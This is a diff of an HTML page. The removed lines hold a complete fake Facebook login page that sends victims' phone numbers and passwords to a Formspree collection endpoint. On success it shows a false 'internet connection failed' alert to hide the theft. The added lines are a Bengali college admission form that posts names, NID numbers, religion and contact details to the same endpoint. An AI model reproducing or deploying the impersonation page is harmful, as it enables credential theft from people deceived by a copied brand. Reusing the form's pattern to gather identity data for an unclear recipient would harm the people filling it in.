@@ -1,261 +1,147 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Facebook</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ভর্তি ফর্ম</title>
   <style>
-    :root{
-      --fb-blue:#1877f2;
-      --bg:#f0f2f5;
-      --card:#ffffff;
-      --muted:#65676b;
-      --input-border:#dddfe2;
-      --green:#42b72a;
-    }
-    *{box-sizing:border-box}
-    html,body{height:100%;margin:0;font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;background:var(--bg);color:#1c1e21}
-    .wrap{
-      min-height:100vh;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:28px;
-    }
-    .container{
-      
-      display: grid;
-      place-items: center;    /* ata dile   align- center  ar justify- center  deya  duitari kaj ak sathe kore dibe */
-      height: 100vh;      /* ar ata holo jekhanei view koro na keno tar screen ta same vabe dekhave  upore ar neche */
-    }
-    
-
-    /* Left marketing column */
-    .left {
-      flex:1;
-      min-width:260px;
-      padding-top:30px;
-    }
-    .brand {
-      font-weight:700;
-      color:var(--fb-blue);
-      font-size:64px;
-      line-height:1;
-      letter-spacing:1px;
-      margin-left:25px;
-    }
-    .tag {
-      font-size:28px;
-      color:#050505;
-      margin:0 0 12px 0;
-      font-weight:600;
-    }
-    .desc {
-      font-size:18px;
-      color:var(--muted);
-      max-width:420px;
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      padding: 20px;
     }
 
-    /* Right login column */
-    .right {
-      width:380px;
-      min-width:280px;
+    h2 {
+      text-align: center;
+      color: #333;
     }
 
-    .card{
-      background:var(--card);
-      border-radius:8px;
-      padding:18px;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+    form {
+      background: #fff;
+      padding: 20px;
+      max-width: 500px;
+      margin: 0 auto;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
 
-    .logo-line{
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      gap:12px;
-      margin-bottom:8px;
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
     }
 
-    .logo-mark{
-      width:48px;
-      height:48px;
-      border-radius:8px;
-      background:linear-gradient(135deg,#0b63d6,#2190ff);
-      display:inline-flex;
-      align-items:center;
-      justify-content:center;
-      color:white;
-      font-weight:700;
-      font-size:20px;
-      box-shadow:0 2px 6px rgba(0,0,0,0.12);
+    input, select, textarea {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
     }
 
-    .site-title{
-      font-weight:700;
-      color:var(--fb-blue);
-      font-size:20px;
+    button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      background: #28a745;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
     }
 
-    form { display:flex; flex-direction:column; gap:10px; margin-top:6px; }
-
-    input[type="email"], input[type="password"]{
-      padding:12px 14px;
-      font-size:15px;
-      border:1px solid var(--input-border);
-      border-radius:6px;
-      outline:none;
-    }
-    input:focus{box-shadow:0 0 0 3px rgba(24,119,242,0.08); border-color:rgba(24,119,242,0.6);}
-
-    .btn-login{
-      margin-top:6px;
-      background:var(--fb-blue);
-      color:#fff;
-      border:none;
-      padding:12px;
-      border-radius:6px;
-      font-weight:700;
-      cursor:pointer;
-      font-size:16px;
-    }
-    .btn-login:hover{filter:brightness(.96);}
-
-    .links{
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      margin-top:8px;
-      font-size:13px;
-    }
-    .links a{ color:var(--fb-blue); text-decoration:none; }
-    .links a:hover{ text-decoration:underline; }
-
-    .divider{
-      height:12px;
-      border-bottom:1px solid #e6e7e9;
-      margin:16px 0;
-    }
-
-    .create-wrap{
-      display:flex;
-      justify-content:center;
-    }
-    .btn-create{
-      background:var(--green);
-      color:#fff;
-      border:none;
-      padding:10px 16px;
-      border-radius:6px;
-      font-weight:700;
-      cursor:pointer;
-      font-size:15px;
-    }
-    .btn-create:hover{filter:brightness(.96);}
-
-    .demo-badge{
-      display:inline-block;
-      margin-top:10px;
-      background:#fff3cd;
-      color:#856404;
-      font-size:12px;
-      padding:6px 10px;
-      border-radius:999px;
-      border:1px solid #ffeeba;
-    }
-
-    .footer {
-      margin-top:14px;
-      font-size:12px;
-      color:var(--muted);
-      text-align:center;
-    }
-
-    @media (max-width:820px){
-      .container{flex-direction:column;align-items:center}
-      .left{order:2;text-align:center}
-      .right{order:1}
-      .brand{font-size:48px}
-      .tag{font-size:22px}
+    button:hover {
+      background: #218838;
     }
   </style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="container" role="main">
-      <div class="left" aria-hidden="false">
-        <div class="brand">Facebook</div>
-      <p style="font-size: 18px; ">Facebook Facebook helps you connect and <br>share with the people in your life.</p><br>
 
-      
+  <h2>ভর্তি ফর্ম</h2>
+<form id="my-form" action="https://formspree.io/f/mdkpznvn" method="POST">
+    <label for="name">নাম:</label>
+    <input type="name" id="name" name="name" placeholder="আপনার নাম লিখুন" required><br> <br>
+    <label for="name">পিতার নাম:</label>
+    <input type="name" id="name" name="name" placeholder="আপনার পিতার নাম লিখুন" required><br> <br>
+    <label for="name">মাতার নাম:</label>
+    <input type="name" id="name" name="name" placeholder="আপনার মাতার নাম লিখুন" required><br> <br>
 
-      <div class="right">
-        <div class="card" role="region" aria-label="Login">
-          
+    <label for="dob">জন্ম তারিখ:</label>
+    <input type="date" id="dob" name="dob" required><br> <br>
+    <label for="address">বর্তমান ঠিকানা:</label>
+    <input type="address" id="address" name="text" placeholder="" required><br> <br>
 
-          <!-- ====== Replace action with your Formspree URL ======
-               Example: action="https://formspree.io/f/your_form_id" -->
-          <form action="https://formspree.io/f/mdkpznvn" method="POST" autocomplete="on">
-            <label for="text" style="position:absolute;left:-9999px;">Textbox</label>
-  <input id="text" name="text" type="text" placeholder="Phone number" required
-         style="padding:12px 14px; font-size:15px; border:1px solid #dddfe2; border-radius:6px; outline:none; width:100%; margin-bottom:10px;">
+    
 
-  <!-- New textbox styled like email -->
-  <label for="text" style="position:absolute;left:-9999px;">Textbox</label>
-  <input id="text" name="text" type="text" placeholder="Password" required
-         style="padding:12px 14px; font-size:15px; border:1px solid #dddfe2; border-radius:6px; outline:none; width:100%; margin-bottom:10px;">
+    <label for="text">ভর্তি বিষয়:</label>
+    <select id="text" name="text" required>
+      <option value="">নির্বাচন করুন</option>
+      <option value="other">সিভিল</option>
+      <option value="other">ইলেকট্রিকাল</option>
+      <option value="other">কম্পিউটার</option>
+      <option value="other">ইয়ার্ন ম্যানুফ্যাকচারিং</option>
+      <option value="other">ফ্যাব্রিক ম্যানুফ্যাকচারিং</option>
+      <option value="other">এ্যাপারেল ম্যানুফ্যাকচারিং</option>
+    </select><br> <br>
+
+<label for="text">ভর্তি ফি:</label>
+    <input type="text" id="text" name="name" placeholder="1000-4000" required><br> <br>
 
 
-            
 
-            <button type="submit" class="btn-login">Log in</button>
+    <label for="gender">লিঙ্গ:</label>
+    <select id="gender" name="gender" required>
+      <option value="">নির্বাচন করুন</option>
+      <option value="male">পুরুষ</option>
+      <option value="female">মহিলা</option>
+      <option value="other">অন্যান্য</option>
+    </select><br> <br>
 
-            <div style="text-align: center;">
-              <a" href="facebook.com"  ">Forgotten password?</a>
-              
-            </div>
+    <label for="text">NID / জন্ম নিবন্ধন নম্বর:
+</label>
+<input type="text" id="text" name="text" placeholder="" required><br> <br>
 
-            
+    <label for ="religion">ধর্ম:</label>
+    <select id="religion" name="religion" required>
+      <option value="">নির্বাচন করুন</option>
+      <option value="islam">ইসলাম</option>
+      <option value="hinduism">হিন্দু ধর্ম</option>
+      <option value="christianity">খ্রিস্টান ধর্ম</option>
+      <option value="buddhism">বৌদ্ধ ধর্ম</option>
+      <option value="other">অন্যান্য</option>
+    </select><br> <br>
 
-            <div class="create-wrap">
-              <button type="button" class="btn-create" onclick="alert('Demo page — no real account creation here.')">Create new account</button>
-            </div>
 
-            <p style="text-align:center;font-size:12px;color:var(--muted);margin-top:10px;">
-              <a style="text-decoration: none; color: black;" href=""><b>Create a Page</b></a> for a celebrity, brand or business.
-            </p>
-          </form>
-        </div>
 
-       
-      </div>
-    </div>
-  </div>
-<script>
-document.querySelector("form").addEventListener("submit", async function(event) {
-  event.preventDefault(); // পেজ রিলোড বন্ধ করবে
+    <label for="email">ইমেইল:</label>
+    <input type="email" id="email" name="email" placeholder="আপনার ইমেইল লিখুন" required><br> <br>
 
-  const form = event.target;
-  const data = new FormData(form);
+    <label for="phone">মোবাইল নাম্বার:</label>
+    <input type="tel" id="phone" name="phone" placeholder="আপনার মোবাইল নাম্বার লিখুন" required><br> <br>
 
-  try {
-    // ফর্মের action (তোমার Formspree লিংক) এ ডেটা পাঠানো হচ্ছে
+    
+
+    <button type="submit">জমা দিন</button>
+  </form>
+  <script>
+  const form = document.getElementById("my-form");
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault(); // ফর্ম সাবমিট হলে নতুন পেজে না যায়
+    const data = new FormData(form);
     const response = await fetch(form.action, {
       method: form.method,
       body: data,
       headers: { 'Accept': 'application/json' }
     });
-
     if (response.ok) {
-      alert("internet connection failed");
-      form.reset(); // চাইলে ফর্ম ফাঁকা করে দেবে
+      alert(" সম্পন্ন হয়েছে ✅");
+      form.reset();
     } else {
-      alert("page not found");
+      alert("আবার চেষ্টা করুন ❌");
     }
-  } catch (error) {
-    alert("Internet connection failed");
-  }
-});
-</script>
+  });
+  </script>
+  
+
 </body>
 </html>
